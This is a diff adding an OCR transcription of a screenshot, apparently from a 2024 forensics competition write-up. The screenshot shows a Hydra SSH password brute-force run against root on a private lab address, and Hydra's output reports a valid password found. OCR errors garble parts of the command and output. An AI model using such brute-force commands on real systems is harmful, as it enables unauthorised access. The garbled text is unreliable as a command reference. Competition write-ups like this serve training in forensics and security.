@@ -1,0 +1,17 @@
+# OCR: 96c8414b3167fc86aabfba58c9b76d41.jpg
+# 来源: ./02-WriteUp/2024/2024-FIC-初赛/96c8414b3167fc86aabfba58c9b76d41.jpg
+# 引擎: Umi-OCR 2.1.5 / PaddleOCR (config_chinese, limit_side_len=2880, multi_para)
+# 路由: chinese-or-general
+# 生成: 2026-11-03 14:10
+
+hydra1 root-p commonPwd.txt ssh://192.168.8.8g
+Hydra vg.5(c)2o23 by van Hauser/THc & DavidMaciejak Please do not use in military or secretservice organizations ing,these ***ignore laws and ethics anyway).
+Hydra(https://github.com/vanhauser-thc/thc-hydra)startingat2024-@4-272o:1o:eo
+[wARNING] Many SsH configurationslimit the number of parallel tasks, it is recommended to reduce the tasks:use -t 4[DATA]max16 tasksper1 server,overall16 tasks,147login tries(l:1/p:l47),-io triesper task
+[DATA]attackingssh://192.168.8.89:22]
+password：qqqqqq
+[22][ssh]host:192.168.8.89login:root
+Iof1targetsuccessfullycompleted,1validpasswordfound
+[wARNING] Writing restore file because 3final worker threads did not complete until end
+[ERRoR]3targetsdidnotresolveorcouldnotbeconnected[ERRoR]otargetdidnotcomplete
+Hydra(https://github.com/vanhauser-thc/thc-hydra)finishedat2o24-o4-272o:1o:44
